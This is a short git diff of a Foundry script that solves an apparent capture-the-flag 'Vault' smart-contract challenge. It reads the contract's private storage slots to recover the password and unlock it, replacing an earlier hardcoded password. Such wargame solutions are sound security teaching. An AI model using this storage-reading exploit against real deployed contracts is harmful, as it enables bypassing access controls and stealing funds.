@@ -7,11 +7,19 @@ import "forge-std/console.sol";
 
 contract VaultSolution is Script {
 
-    Vault public valutInstance = Vault(0xcF7af82Ac269382E65A5De1C2E5D05e7BeBFdD91);
+    Vault public vaultInstance = Vault(0x9A098F2406b3DEAF9C9523ddC9D09C82B5f61045);
 
     function run() external {
         vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
-        valutInstance.unlock(0x412076657279207374726f6e67207365637265742070617373776f7264203a29);
+        
+        bytes32 locked = vm.load(address(vaultInstance), bytes32(uint256(0)));
+        console.logBytes32(locked);
+
+        bytes32 password = vm.load(address(vaultInstance), bytes32(uint256(1)));
+        console.logBytes32(password);
+
+        vaultInstance.unlock(password);
+
         vm.stopBroadcast();
     }
 }
